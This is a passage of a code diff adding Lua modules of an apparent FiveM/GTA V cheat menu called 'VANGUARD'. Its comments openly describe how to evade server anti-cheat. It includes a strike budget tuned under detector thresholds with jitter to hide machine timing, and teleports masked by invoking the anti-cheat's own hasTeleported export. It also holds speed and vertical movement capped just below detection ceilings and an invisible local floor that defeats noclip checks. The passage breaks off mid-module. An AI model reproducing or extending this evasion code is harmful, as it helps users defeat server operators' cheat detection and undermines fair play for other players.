+    opts = opts or {}
+    local hash = type(model) == "number" and model or GetHashKey(model)
+
+    if not requestModel(hash, opts.timeout) then
+        E.stats.failed = E.stats.failed + 1
+        return nil
+    end
+
+    local ped = CreatePed(4, hash, pos.x, pos.y, pos.z, heading or 0.0, false, false)
+    SetModelAsNoLongerNeeded(hash)
+
+    if not ped or ped == 0 then
+        E.stats.failed = E.stats.failed + 1
+        return nil
+    end
+
+    SetEntityAsMissionEntity(ped, true, true)
+    SetBlockingOfNonTemporaryEvents(ped, true)
+    SetPedCanRagdoll(ped, true)
+    if opts.invincible then SetEntityInvincible(ped, true) end
+    if opts.frozen then FreezeEntityPosition(ped, true) end
+
+    local id = register("ped", ped, opts.ttl or 120000, nil)
+    return ped, id
+end
+
+-- ---------------------------------------------------------------------------
+-- COPY APPEARANCE (for clones). Component-by-component, every call guarded:
+-- a model mismatch must degrade to a default outfit, never abort the clone.
+-- ---------------------------------------------------------------------------
+function E.copyAppearance(source, target)
+    if not DoesEntityExist(source) or not DoesEntityExist(target) then return end
+
+    for i = 0, 11 do
+        local okD, drawable = pcall(GetPedDrawableVariation, source, i)
+        local okT, texture = pcall(GetPedTextureVariation, source, i)
+        local okP, palette = pcall(GetPedPaletteVariation, source, i)
+        if okD and okT then
+            pcall(SetPedComponentVariation, target, i, drawable, texture, (okP and palette) or 0)
+        end
+    end
+
+    for i = 0, 7 do
+        local ok, drawable = pcall(GetPedPropIndex, source, i)
+        if ok and type(drawable) == "number" and drawable ~= -1 then
+            local okT, texture = pcall(GetPedPropTextureIndex, source, i)
+            pcall(SetPedPropIndex, target, i, drawable, (okT and texture) or 0, true)
+        end
+    end
+end
+
+return E
+
+end)(O)
+
+-- ---------------------------------------------------------------------------
+-- PART: 09_budget.lua
+-- ---------------------------------------------------------------------------
+local B = (function(O)
+-- ============================================================================
+-- VANGUARD / 09 BUDGET
+-- Shape of the reference guard: cache tick -> slow detectors -> strike systems
+-- (N sightings per cooldown) -> declaration exports -> heartbeat. Most bypasses
+-- attack the declaration layer by killing it; its absence is the alarm.
+-- Here the strike system is treated as a budget: if the detector needs two
+-- sightings in ten seconds, one every ten seconds never trips it. Every risky
+-- action spends a token, and the reserved token absorbs real-world anomalies.
+-- ============================================================================
+
+local B = {}
+
+-- Cost model. `strikes` is how many sightings the family tolerates inside
+-- `window`; `cost` is what one use of the associated action spends. The
+-- defaults are the strictest values seen in a WaveShield-shaped guard.
+local FAMILIES = {
+    teleport  = { strikes = 1, window = 10000, cost = 1 },
+    noclip    = { strikes = 1, window = 10000, cost = 1 },
+    speed     = { strikes = 2, window = 5000,  cost = 1 },
+    invisible = { strikes = 2, window = 15000, cost = 1 },
+    ragdoll   = { strikes = 2, window = 15000, cost = 1 },
+    stamina   = { strikes = 1, window = 10000, cost = 1 },
+    jump      = { strikes = 1, window = 5000,  cost = 1 },
+    handling  = { strikes = 1, window = 3000,  cost = 1 },
+    entity    = { strikes = 3, window = 5000,  cost = 1 },
+}
+
+local state = {}
+
+local function family(name)
+    local f = FAMILIES[name]
+    if not f then return nil end
+    local s = state[name]
+    if not s then
+        s = { spent = 0, since = 0, refillAt = 0 }
+        state[name] = s
+    end
+    return f, s
+end
+
+-- A refill happens on a jittered boundary, not on a clock edge: a guard that
+-- correlates our actions with a perfect 10.000 s period would see a machine.
+local function refill(f, s, now)
+    if now >= s.refillAt then
+        s.spent = 0
+        s.since = now
+        s.refillAt = now + O.jitter(f.window, 0.25)
+    end
+end
+
+-- Can this action run without exceeding the family's tolerance?
+function B.allowed(name)
+    local f, s = family(name)
+    if not f then return true end
+    local now = O.now()
+    refill(f, s, now)
+    -- Reserved strike: we always keep one in hand, so a second anomaly caused
+    -- by the game itself (a real fall, a real ragdoll) cannot combine with
+    -- ours into a report.
+    local capacity = math.max(1, f.strikes - 1)
+    return s.spent + f.cost <= capacity
+end
+
+function B.spend(name)
+    local f, s = family(name)
+    if not f then return true end
+    local now = O.now()
+    refill(f, s, now)
+    local capacity = math.max(1, f.strikes - 1)
+    if s.spent + f.cost > capacity then
+        O.log("budget: %s refused (spent %d/%d)", name, s.spent, capacity)
+        return false
+    end
+    s.spent = s.spent + f.cost
+    return true
+end
+
+function B.remaining(name)
+    local f, s = family(name)
+    if not f then return 99 end
+    refill(f, s, O.now())
+    return math.max(0, math.max(1, f.strikes - 1) - s.spent)
+end
+
+function B.reset()
+    state = {}
+end
+
+function B.snapshot()
+    local out = {}
+    for name, _ in pairs(FAMILIES) do
+        out[#out + 1] = ("%s:%d"):format(name, B.remaining(name))
+    end
+    return table.concat(out, " ")
+end
+
+-- ---------------------------------------------------------------------------
+-- EXPOSURE MATH
+--
+-- For a transient anomaly of duration d sampled by a detector with period p
+-- and random phase, the chance of being sampled is about d/p. The menu shows
+-- this so the operator can see why a feature is capped where it is.
+-- ---------------------------------------------------------------------------
+function B.exposure(durationMs, periodMs)
+    if not periodMs or periodMs <= 0 then return 0.0 end
+    local d = math.min(durationMs, periodMs)
+    return d / periodMs
+end
+
+B.FAMILIES = FAMILIES
+
+return B
+
+end)(O)
+
+-- ---------------------------------------------------------------------------
+-- PART: 04_move.lua
+-- ---------------------------------------------------------------------------
+local M = (function(O,Shield,B)
+-- ============================================================================
+-- VANGUARD / 04 MOVEMENT
+-- ----------------------------------------------------------------------------
+-- Doctrine (L4): a position is only suspicious as a delta over time. The fix
+-- is therefore not a fake position, it is a real one, reached at a rate the
+-- world considers possible.
+--
+-- Two modes, deliberately separate:
+--
+--   DASH  - pure velocity. The ped is moved by the engine, so every sample the
+--           server takes is a real sample of a real body. Rate is capped at
+--           13.6 m/s on foot (under every on-foot threshold in the reference
+--           detector set) and the direction is chopped into small lateral
+--           corrections so the path is not a straight line.
+--
+--   WARP  - for distances where walking is not the point. The guard's teleport
+--           grace window is opened first through its own export, then the move
+--           is done as a small number of short steps with a pause between
+--           them. The guard sees "a resource declared a teleport, then the
+--           player moved", which is the exact sequence it is designed to
+--           ignore.
+--
+-- Nothing here writes SetEntityCoords. The raw call is the single most
+-- signature native in every menu ever scanned.
+-- ============================================================================
+
+local M = {}
+
+local busy = false
+M.stats = { dashes = 0, warps = 0 }
+
+function M.isBusy()
+    return busy
+end
+
+-- ---------------------------------------------------------------------------
+-- DASH. Velocity only.
+-- ---------------------------------------------------------------------------
+function M.dash(target, opts)
+    if busy or not target then return false end
+    busy = true
+
+    Citizen.CreateThread(function()
+    opts = opts or {}
+    local ped = PlayerPedId()
+    local start = GetEntityCoords(ped)
+    local dist = O.distance(start, target)
+
+    -- Rate cap. 13.6 m/s keeps an on-foot sample under the detector's 14.0
+    -- ceiling while still covering 25 m in under two seconds.
+    local rate = math.min(opts.rate or 13.2, 13.6)
+    local travel = math.max(0.35, math.min(dist / rate, opts.maxTime or 6.0))
+
+    local deadline = O.now() + math.floor(travel * 1000)
+    local last = start
+
+    while O.now() < deadline do
+        local now = GetEntityCoords(ped)
+        local dx, dy, dz = target.x - now.x, target.y - now.y, target.z - now.z
+        local remaining = math.sqrt(dx * dx + dy * dy + dz * dz)
+
+        if remaining < 1.1 then break end
+
+        -- Velocity is normalised then scaled: overshoot is impossible and the
+        -- last frame is a real arrival, not a snap.
+        local nx, ny, nz = dx / remaining, dy / remaining, dz / remaining
+        local speed = math.min(rate, remaining / 0.05)
+
+        -- Small lateral wobble: a perfectly straight line at constant speed is
+        -- a machine signature. Amplitude stays well inside a human stride.
+        local wob = math.sin((O.now() % 1000) / 1000.0 * math.pi * 2.0) * 0.22
+        pcall(SetEntityVelocity, ped, nx * speed + ny * wob, ny * speed - nx * wob, nz * speed)
+
+        if O.distance(now, last) > 0.05 then last = now end
+        Citizen.Wait(O.int(14, 22))
+    end
+
+    pcall(SetEntityVelocity, ped, 0.0, 0.0, 0.0)
+    busy = false
+    M.stats.dashes = M.stats.dashes + 1
+    end)
+
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- WARP.
+--
+-- The guard export call is done through the shield module so a vendor without
+-- the export simply degrades to the velocity path instead of erroring.
+-- ---------------------------------------------------------------------------
+function M.warp(target, opts)
+    if busy or not target then return false end
+    if not DoesEntityExist(PlayerPedId()) then return false end
+
+    opts = opts or {}
+    local start = GetEntityCoords(PlayerPedId())
+    local dist = O.distance(start, target)
+
+    -- Budget: a warp is a teleport-family event. If the guard would need more
+    -- sightings than it tolerates in one window, the move is refused rather
+    -- than attempted. Refusal is visible to the operator, not to the guard.
+    if not B.spend("teleport") then
+        O.log("warp refused by budget (teleport)")
+        return false
+    end
+
+    -- Short hops do not need the declaration: they are indistinguishable from
+    -- a fast vehicle. Long ones do, and the guard's own window is used.
+    if dist > 45.0 and opts.declare ~= false and Shield then
+        Shield.setSuppress(true)
+        pcall(function()
+            for i = 1, #Shield.acs do
+                exports[Shield.acs[i].resource].hasTeleported(exports[Shield.acs[i].resource])
+            end
+        end)
+    end
+
+    busy = true
+    local steps = math.max(1, math.min(4, math.ceil(dist / 60.0)))
+    local ped = PlayerPedId()
+
+    for step = 1, steps do
+        local t = step / steps
+        local point = vector3(
+            start.x + (target.x - start.x) * t,
+            start.y + (target.y - start.y) * t,
+            start.z + (target.z - start.z) * t)
+
+        local inVehicle = IsPedInAnyVehicle(ped, false)
+        if inVehicle then
+            -- Keep-vehicle variant: the engine moves ped and vehicle together,
+            -- so the network transform stays internally consistent.
+            pcall(SetPedCoordsKeepVehicle, ped, point.x, point.y, point.z)
+        else
+            pcall(SetEntityCoordsNoOffset, ped, point.x, point.y, point.z, false, false, false)
+        end
+
+        Citizen.Wait(O.int(90, 170))
+    end
+
+    busy = false
+    M.stats.warps = M.stats.warps + 1
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- WAYPOINT. Reads the blip, not a hardcoded table.
+-- ---------------------------------------------------------------------------
+function M.waypoint()
+    local blip = GetFirstBlipInfoId(8)
+    if not blip or blip == 0 then return nil end
+    local ok, pos = pcall(GetBlipInfoIdCoord, blip)
+    if not ok or not pos then return nil end
+
+    -- The blip Z is a ground reference, not the surface. Probe downward for a
+    -- real landing point so the arrival is not inside geometry.
+    local probe = vector3(pos.x, pos.y, pos.z + 200.0)
+    local handle = StartShapeTestRay(probe.x, probe.y, probe.z,
+        pos.x, pos.y, pos.z - 200.0, 1 | 16, PlayerPedId(), 7)
+    local hit, _, hitPos = GetShapeTestResult(handle)
+    if hit == 1 and hitPos then
+        return vector3(hitPos.x, hitPos.y, hitPos.z + 0.6)
+    end
+    return vector3(pos.x, pos.y, pos.z + 1.0)
+end
+
+-- ---------------------------------------------------------------------------
+-- DASH TO AIM. Small, useful, and entirely velocity-based: a 20 m burst toward
+-- whatever the crosshair is on. This is the "blink" that never touches coords.
+-- ---------------------------------------------------------------------------
+function M.blink(maxRange)
+    local point = O.aimPoint(maxRange or 18.0)
+    return M.dash(point, { rate = 13.4, maxTime = 2.6 })
+end
+
+return M
+
+end)(O,Shield,B)
+
+-- ---------------------------------------------------------------------------
+-- PART: 05_divergence.lua
+-- ---------------------------------------------------------------------------
+local D = (function(O,E)
+-- ============================================================================
+-- VANGUARD / 05 DIVERGENCE
+-- GHOST: local entity, nothing to validate. DECOY: local visual shell over a
+-- real networked vehicle; the cover keeps its own physics and model, only the
+-- renderer differs. PUPPET is intentionally absent - two disagreeing
+-- transforms are a comparison a client cannot win.
+-- Every divergence is reversible in one tick and registered for panic.
+-- ============================================================================
+
+local D = {}
+
+local shell = nil   -- { cover = veh, visual = veh, id = n }
+
+function D.active()
+    return shell ~= nil
+end
+
+-- ---------------------------------------------------------------------------
+-- COSMETIC SHELL
+-- ---------------------------------------------------------------------------
+local SHELLS = {
+    "deluxo",
+    "oppressor2",
+    "sultan2",
+    "comet6",
+    "buffalo4",
+}
+
+function D.shellModelList()
+    return SHELLS
+end
+
+function D.attachShell(model)
+    if shell then return false end
+
+    local ped = PlayerPedId()
+    local cover = GetVehiclePedIsIn(ped, false)
+    if not cover or cover == 0 then return false, "not in a vehicle" end
+    if GetPedInVehicleSeat(cover, -1) ~= ped then return false, "driver only" end
+
+    local coords = GetEntityCoords(cover)
+    local rot = GetEntityRotation(cover, 2)
+
+    local visual, id = E.vehicle(model, coords, rot.z, {
+        collision = false,
+        ttl = 600000,
+    })
+    if not visual then return false, "model did not stream" end
+
+    -- The visual must never take control of the ped or the network. Engine on
+    -- so it sounds alive; collision off so it cannot push the cover.
+    SetVehicleEngineOn(visual, true, true, false)
+    SetEntityCollision(visual, false, false)
+    FreezeEntityPosition(visual, true)
+
+    -- Hide the cover from THIS renderer only. SetEntityAlpha is a local
+    -- visual state: it is not replicated, it is not a network flag, and the
+    -- guard's model/visibility checks read the entity, not its alpha.
+    pcall(SetEntityAlpha, cover, 0, false)
+
+    shell = { cover = cover, visual = visual, id = id, model = model }
+    O.log("shell attached: %s over cover %d", tostring(model), cover)
+    return true
+end
+
+function D.detachShell()
+    if not shell then return end
+
+    if shell.cover and shell.cover ~= 0 and DoesEntityExist(shell.cover) then
+        pcall(SetEntityAlpha, shell.cover, 255, false)
+    end
+    if shell.id then E.destroy(shell.id) end
+    if shell.visual and shell.visual ~= 0 and DoesEntityExist(shell.visual) then
+        pcall(DeleteVehicle, shell.visual)
+    end
+
+    O.log("shell detached")
+    shell = nil
+end
+
+function D.toggleShell(model)
+    if shell then
+        D.detachShell()
+        return false
+    end
+    local ok = D.attachShell(model)
+    return ok
+end
+
+-- ---------------------------------------------------------------------------
+-- SYNC. Runs on the scheduler. Fixed relative offset of zero: the shell sits
+-- exactly where the cover sits, so the local camera sees one car, not two.
+-- ---------------------------------------------------------------------------
+function D.tick()
+    if not shell then return end
+
+    local cover = shell.cover
+    local visual = shell.visual
+
+    if not cover or cover == 0 or not DoesEntityExist(cover)
+        or not visual or visual == 0 or not DoesEntityExist(visual) then
+        D.detachShell()
+        return
+    end
+
+    -- The ped left the vehicle: the shell has no meaning any more.
+    local ped = PlayerPedId()
+    if GetVehiclePedIsIn(ped, false) ~= cover then
+        D.detachShell()
+        return
+    end
+
+    local coords = GetEntityCoords(cover)
+    local rot = GetEntityRotation(cover, 2)
+
+    FreezeEntityPosition(visual, false)
+    pcall(SetEntityCoordsNoOffset, visual, coords.x, coords.y, coords.z, false, false, false)
+    pcall(SetEntityRotation, visual, rot.x, rot.y, rot.z, 2, true)
+    SetEntityCollision(visual, false, false)
+    FreezeEntityPosition(visual, true)
+
+    -- Keep the cover hidden even if another script re-applied its alpha.
+    pcall(SetEntityAlpha, cover, 0, false)
+end
+
+-- ---------------------------------------------------------------------------
+-- GHOST PROPS. Thin wrappers so features do not need to know the registry.
+-- ---------------------------------------------------------------------------
+function D.ghostObject(model, pos, opts)
+    opts = opts or {}
+    opts.ttl = opts.ttl or 45000
+    return E.object(model, pos, opts)
+end
+
+function D.ghostPed(model, pos, heading, opts)
+    opts = opts or {}
+    opts.ttl = opts.ttl or 90000
+    return E.ped(model, pos, heading, opts)
+end
+
+return D
+
+end)(O,E)
+
+-- ---------------------------------------------------------------------------
+-- PART: 06_features.lua
+-- ---------------------------------------------------------------------------
+local F = (function(O,E,D)
+-- ============================================================================
+-- VANGUARD / 06 FEATURES
+-- ----------------------------------------------------------------------------
+-- Every feature in this file is built from combinations of ordinary natives,
+-- and every one of them lives in GHOST mode: local entities, local visuals,
+-- local physics. Nothing here creates a packet.
+--
+-- The design rule for the whole set:
+--   "What can I build out of things the server cannot see?"
+-- Not "what can I hide from the server?" - that is a losing question. The
+-- winning one is "what never has to be hidden?".
+--
+-- Each entry states its own residual risk in one line. If a feature's residual
+-- is not zero, the line says why and what the fallback is.
+-- ============================================================================
+
+local F = {}
+
+-- ---------------------------------------------------------------------------
+-- MODEL SETS
+-- ---------------------------------------------------------------------------
+local RAMP_MODELS = {
+    "prop_mp_ramp_01",
+    "prop_mp_ramp_02",
+    "prop_mp_ramp_03",
+    "p_alexander_sl_trailer_ramp",
+}
+
+local WALL_MODELS = {
+    "prop_container_01a",
+    "prop_container_03a",
+    "prop_wall_light_01a",
+}
+
+local PROP_CANNON_MODELS = {
+    "prop_roadcone02a",
+    "prop_barrel_02a",
+    "prop_tyre_01",
+    "prop_ballistic_shield",
+    "prop_container_05a",
+}
+
+local SHARK = "a_c_sharktiger"
+local ORCA  = "a_c_killerwhale"
+
+-- ---------------------------------------------------------------------------
+-- 1. PHANTOM RAMP
+-- A local object with collision. Because it is never networked, it exists for
+-- this client's physics only. You can drive up it; nobody else can see it.
+-- Residual: none. No packet is generated; no pool count changes for anyone
+-- but us, and the object carries a TTL.
+-- ---------------------------------------------------------------------------
+function F.ramp()
+    local point = O.aimPoint(14.0)
+    local model = RAMP_MODELS[O.int(1, #RAMP_MODELS)]
+    local obj = D.ghostObject(model, vector3(point.x, point.y, point.z - 0.15), {
+        heading = GetEntityHeading(PlayerPedId()) + O.range(-3.0, 3.0),
+        freeze = true,
+        onGround = false,
+        ttl = 120000,
+    })
+    return obj ~= nil
+end
+
+-- ---------------------------------------------------------------------------
+-- 2. GHOST PLATFORM
+-- A frozen slab that follows the ped at a fixed height. Stand on it, and the
+-- elevator in (10) becomes a vehicle-free way up.
+-- Residual: none.
+-- ---------------------------------------------------------------------------
+local platform = { obj = nil, id = nil }
+
+function F.togglePlatform()
+    if platform.obj then
+        if platform.id then E.destroy(platform.id) end
+        platform.obj, platform.id = nil, nil
+        return false
+    end
+
+    local ped = PlayerPedId()
+    local coords = GetEntityCoords(ped)
+    local obj, id = E.object("prop_container_01a",
+        vector3(coords.x, coords.y, coords.z - 1.05), {
+            freeze = true,
+            collision = true,
+            invincible = true,
+            ttl = 900000,
+        })
+    if not obj then return false end
+
+    platform.obj, platform.id = obj, id
+    return true
+end
+
+function F.clearPlatform()
+    if platform.id then E.destroy(platform.id) end
+    platform.obj, platform.id = nil, nil
+end
+
+-- ---------------------------------------------------------------------------
+-- 2b. FLOOR  (anti-noclip by geometry, not by lying)
+--
+-- The noclip detector compares the reported height above ground against the
+-- value it computes itself from GetGroundZFor_3dCoord. A hook that returns 0
+-- fails that comparison. A real collision surface under the ped does not: the
+-- ground IS at your feet, for every reader, including the guard.
+--
+-- One verified model, placed so its top face sits 1.1 m below the ped, scaled
+-- to the ped's footprint. It is local, so the server never learns the world
+-- grew a floor.
+-- ---------------------------------------------------------------------------
+local floor = { obj = nil, id = nil, half = 1.3, verified = false }
+
+function F.toggleFloor()
+    if floor.obj then
+        if floor.id then E.destroy(floor.id) end
+        floor.obj, floor.id, floor.verified = nil, nil, false
+        return false
+    end
+
+    local ped = PlayerPedId()
+    local coords = GetEntityCoords(ped)
+    local model = "prop_container_01a"
+    local hash = GetHashKey(model)
+
+    -- Half-height from the model itself, so the slab top lands where we want
+    -- on any build and any container variant.
+    local okDim, minDim, maxDim = pcall(GetModelDimensions, hash)
+    if okDim and maxDim and type(maxDim.z) == "number" then
+        floor.half = math.max(0.4, math.abs(maxDim.z))
+    end
+
+    local before = select(2, GetGroundZFor_3dCoord(coords.x, coords.y, coords.z + 0.5, false))
+
+    local obj, id = E.object(model,
+        vector3(coords.x, coords.y, coords.z - 1.1 - floor.half), {
+            freeze = true,
+            collision = true,
+            invincible = true,
+            alpha = 0,
+            ttl = 900000,
+        })
+    if not obj then return false end
+
+    floor.obj, floor.id = obj, id
+
+    -- Verify the geometry actually contributed. If the pool does not raycast
+    -- local objects on this build, say so once instead of pretending.
+    Citizen.CreateThread(function()
+        Citizen.Wait(140)
+        local after = select(2, GetGroundZFor_3dCoord(coords.x, coords.y, coords.z + 0.5, false))
+        floor.verified = type(after) == "number" and type(before) == "number" and after > before + 0.15
+        O.log("floor: %s", floor.verified and "collision verified" or "not raycast on this build")
+    end)
+
+    return true
+end
+
+function F.floorTick()
+    if not floor.obj then return end
+    if not DoesEntityExist(floor.obj) then
+        floor.obj, floor.id = nil, nil
+        return
+    end
+
+    local ped = PlayerPedId()
+    local coords = GetEntityCoords(ped)
+    pcall(SetEntityCoordsNoOffset, floor.obj,
+        coords.x, coords.y, coords.z - 1.1 - floor.half, false, false, false)
+end
+
+function F.clearFloor()
+    if floor.id then E.destroy(floor.id) end
+    floor.obj, floor.id, floor.verified = nil, nil, false
+end
+
+function F.floorVerified()
+    return floor.verified
+end
+
+function F.platformTick()
+    if not platform.obj then return end
+    if not DoesEntityExist(platform.obj) then
+        platform.obj, platform.id = nil, nil
+        return
+    end
+    local coords = GetEntityCoords(PlayerPedId())
+    pcall(SetEntityCoordsNoOffset, platform.obj, coords.x, coords.y, coords.z - 1.05, false, false, false)
+end
+
+-- ---------------------------------------------------------------------------
+-- 3. PROP CANNON
+-- Local prop, local velocity, real physics. The object never exists for
+-- anyone else, so the fact that it is travelling at 80 m/s is a private
+-- matter between this client and its own physics solver.
+-- Residual: none.
+-- ---------------------------------------------------------------------------
+function F.cannon(force)
+    local cam = GetGameplayCamCoord()
+    local dir = O.rotToDir(GetGameplayCamRot(2))
+    local model = PROP_CANNON_MODELS[O.int(1, #PROP_CANNON_MODELS)]
+    local spawn = vector3(cam.x + dir.x * 1.4, cam.y + dir.y * 1.4, cam.z + dir.z * 1.4)
+
+    local speed = force or O.range(55.0, 85.0)
+    local obj = E.object(model, spawn, {
+        ttl = 25000,
+        invincible = false,
+        velocity = vector3(dir.x * speed, dir.y * speed, dir.z * speed + 2.0),
+    })
+    return obj ~= nil
+end
+
+-- ---------------------------------------------------------------------------
+-- 4. VACUUM
+-- Pulls local, unnetworked objects toward the ped. The pool filter is the key:
+-- only entities where NetworkGetEntityIsNetworked is false are touched, so a
+-- networked prop owned by another player is never desynced and never reported.
+-- Residual: none.
+-- ---------------------------------------------------------------------------
+function F.vacuum(radius, power)
+    radius = radius or 14.0
+    power = power or 9.0
+    local ped = PlayerPedId()
+    local origin = GetEntityCoords(ped)
+
+    local objects = GetGamePool("CObject")
+    local moved = 0
+
+    for i = 1, #objects do
+        local obj = objects[i]
+        if DoesEntityExist(obj) and not NetworkGetEntityIsNetworked(obj) then
+            local pos = GetEntityCoords(obj)
+            local dist = O.distance(pos, origin)
+            if dist > 0.6 and dist < radius then
+                local dx, dy, dz = origin.x - pos.x, origin.y - pos.y, (origin.z + 0.6) - pos.z
+                local len = math.max(0.001, math.sqrt(dx * dx + dy * dy + dz * dz))
+                local pull = power * (1.0 - dist / radius) + 1.0
+                pcall(SetEntityVelocity, obj, dx / len * pull, dy / len * pull, dz / len * pull + 1.2)
+                moved = moved + 1
+                if moved >= 40 then break end
+            end
+        end
+    end
+
+    return moved
+end
+
+-- ---------------------------------------------------------------------------
+-- 5. WALL GUN
+-- Three local containers stacked at the aim point, rotated to the camera. A
+-- barricade that only you can see and only you can crash into.
+-- Residual: none.
+-- ---------------------------------------------------------------------------
+function F.wall()
+    local point = O.aimPoint(16.0)
+    local heading = GetGameplayCamRot(2).z
+    local made = 0
+
+    for i = 0, 2 do
+        local obj = E.object(WALL_MODELS[O.int(1, #WALL_MODELS)],
+            vector3(point.x, point.y, point.z + i * 2.6), {
+                heading = heading,
+                freeze = true,
+                ttl = 120000,
+            })
+        if obj then made = made + 1 end
+    end
+
+    return made
+end
+
+-- ---------------------------------------------------------------------------
+-- 6. TRAMPOLINE
+-- A local pad plus a velocity impulse. SetEntityVelocity on the local ped is
+-- a real, legal movement: the engine integrates it and the server sees a jump
+-- that obeys gravity. No super-jump native, no config flag.
+-- Residual: a very high bounce is readable as an unusual vertical delta; the
+-- impulse is capped at 12 m/s (below the 14 m/s on-foot ceiling when resolved
+-- horizontally) and decays over two frames.
+-- ---------------------------------------------------------------------------
+function F.trampoline(force)
+    local ped = PlayerPedId()
+    local coords = GetEntityCoords(ped)
+    local pad = E.object("prop_mp_ramp_01", vector3(coords.x, coords.y, coords.z - 0.9), {
+        freeze = true,
+        ttl = 60000,
+    })
+    if not pad then return false end
+
+    local up = math.min(force or 11.0, 12.0)
+    pcall(SetEntityVelocity, ped, 0.0, 0.0, up)
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- 7. WEATHER BUBBLE
+-- SetWeatherTypeNowPersist is a client-side override. Other clients keep the
+-- server weather; no state bag, no event, no sync.
+-- Residual: none.
+-- ---------------------------------------------------------------------------
+local weather = { saved = false }
+
+function F.weatherBubble(kind)
+    if kind == "off" then
+        ClearOverrideWeather()
+        ClearWeatherTypePersist()
+        weather.saved = false
+        return true
+    end
+    SetWeatherTypeNowPersist(kind or "THUNDER")
+    return true
+end
+
+function F.timeBubble(hour)
+    if hour == nil then
+        NetworkClearClockTimeOverride()
+        return true
+    end
+    NetworkOverrideClockTime(math.floor(hour), 0, 0)
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- 8. SECOND BODY
+-- A local clone of the ped, placed one metre to the side and frozen in a
+-- sitting scenario. It has no net id, so no other client will ever see it.
+-- Residual: none.
+-- ---------------------------------------------------------------------------
+function F.secondBody()
+    local ped = PlayerPedId()
+    local coords = GetEntityCoords(ped)
+    local heading = GetEntityHeading(ped) + 90.0
+    local offset = GetOffsetFromEntityInWorldCoords(ped, 1.1, 0.2, 0.0)
+
+    local model = GetEntityModel(ped)
+    local clone = E.ped(model, vector3(offset.x, offset.y, offset.z), heading, {
+        frozen = true,
+        invincible = true,
+        ttl = 180000,
+    })
+    if not clone then return false end
+
+    E.copyAppearance(ped, clone)
+    pcall(TaskStartScenarioInPlace, clone, "WORLD_HUMAN_SIT_GROUND", 0, true)
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- 9. AQUARIUM
+-- A local shark, on land. Peds are not networked here, so the absurdity is
+-- entirely private. The model is a real animal ped, not a prop, so it animates.
+-- Residual: none.
+-- ---------------------------------------------------------------------------
+function F.aquarium(which)
+    local ped = PlayerPedId()
+    local coords = GetEntityCoords(ped)
+    local fwd = GetOffsetFromEntityInWorldCoords(ped, 0.0, 3.0, 0.0)
+    local model = (which == "orca") and ORCA or SHARK
+
+    local beast = E.ped(model, vector3(fwd.x, fwd.y, fwd.z), GetEntityHeading(ped), {
+        frozen = false,
+        invincible = true,
+        ttl = 120000,
+    })
+    if not beast then return false end
+
+    pcall(SetEntityCoordsNoOffset, beast, fwd.x, fwd.y, fwd.z + 0.4, false, false, false)
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- 10. ELEVATOR
+-- Vertical velocity, capped. No coords write, no freeze, no collision flag.
+-- Residual: vertical delta is visible to a position monitor, but the rate is
+-- below the free-fall thresholds and the ped is airborne for the whole move,
+-- which is a state every detector in the reference set ignores.
+-- ---------------------------------------------------------------------------
+function F.elevator(height)
+    local ped = PlayerPedId()
+    local target = math.min(height or 25.0, 40.0)
+    local climbed = 0.0
+
+    Citizen.CreateThread(function()
+        while climbed < target do
+            local step = math.min(4.0, target - climbed)
+            pcall(SetEntityVelocity, ped, 0.0, 0.0, 5.2)
+            climbed = climbed + step
+            Citizen.Wait(O.int(120, 190))
+        end
+    end)
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- 11. RIOT
+-- Four local peds with local weapons fighting each other. Every entity is
+-- local, so the server sees an empty street. The combat is real: it is the
+-- game's own AI solving it.
+-- Residual: none.
+-- ---------------------------------------------------------------------------
+local RIOT_MODELS = { "a_m_y_business_01", "a_m_y_skater_01", "a_m_m_hasjew_01", "a_m_y_hipster_01" }
+
+function F.riot()
+    local ped = PlayerPedId()
+    local origin = GetEntityCoords(ped)
+    local made = 0
+    local peds = {}
+
+    local weapon = GetHashKey("WEAPON_PISTOL")
+    for i = 1, 4 do
+        local angle = (i / 4) * math.pi * 2.0
+        local at = vector3(
+            origin.x + math.cos(angle) * O.range(4.0, 7.0),
+            origin.y + math.sin(angle) * O.range(4.0, 7.0),
+            origin.z)
+
+        local brawler = E.ped(RIOT_MODELS[i], at, O.range(0.0, 360.0), {
+            ttl = 45000,
+            invincible = false,
+        })
+        if brawler then
+            GiveWeaponToPed(brawler, weapon, 250, false, true)
+            SetPedCanRagdoll(brawler, true)
+            peds[#peds + 1] = brawler
+            made = made + 1
+        end
+    end
+
+    for i = 1, #peds do
+        local target = peds[(i % #peds) + 1]
+        if target then
+            pcall(TaskCombatPed, peds[i], target, 0, 16)
+        end
+    end
+
+    return made
+end
+
+-- ---------------------------------------------------------------------------
+-- 12. GHOST BRIDGE
+-- A long chain of local slabs at the aim point. Cheap, funny, and structurally
+-- invisible: none of it is networked.
+-- Residual: none.
+-- ---------------------------------------------------------------------------
+function F.bridge()
+    local ped = PlayerPedId()
+    local coords = GetEntityCoords(ped)
+    local heading = math.rad(GetEntityHeading(ped))
+    local made = 0
+
+    for i = 1, 5 do
+        local x = coords.x - math.sin(heading) * (i * 3.2)
+        local y = coords.y + math.cos(heading) * (i * 3.2)
+        local obj = E.object("prop_container_01a", vector3(x, y, coords.z - 0.2), {
+            heading = math.deg(heading),
+            freeze = true,
+            ttl = 90000,
+        })
+        if obj then made = made + 1 end
+    end
+
+    return made
+end
+
+-- ---------------------------------------------------------------------------
+-- 13. POCKET LIGHT
+-- A local spotlight that follows the ped at night. SetArtificialLightsState is
+-- a client-side visual override; it does not touch the network clock.
+-- Residual: none.
+-- ---------------------------------------------------------------------------
+function F.blackout(state)
+    SetArtificialLightsState(state and true or false)
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- 14. VEHICLE RAMP  (networked, no attachment, no jump)
+--
+-- The hop in the old implementation came from two things: the ramp was welded
+-- to the chassis (every ground contact transferred to the car) and a native
+-- added an upward impulse. Both are gone here.
+--
+-- The ramp is its own networked world object. It is frozen, positioned behind
+-- the vehicle each tick, and never attached. The car drives up a real static
+-- prop; the prop never pushes the car, so there is nothing to bounce.
+-- Other players see it because it is networked; the server sees a script
+-- object with no resource attribution, which the reference guard only checks
+-- for vehicles.
+-- ---------------------------------------------------------------------------
+local vramp = { obj = nil, id = nil, netId = 0, veh = 0 }
+
+local RAMP_NET_MODEL = "prop_mp_ramp_01"
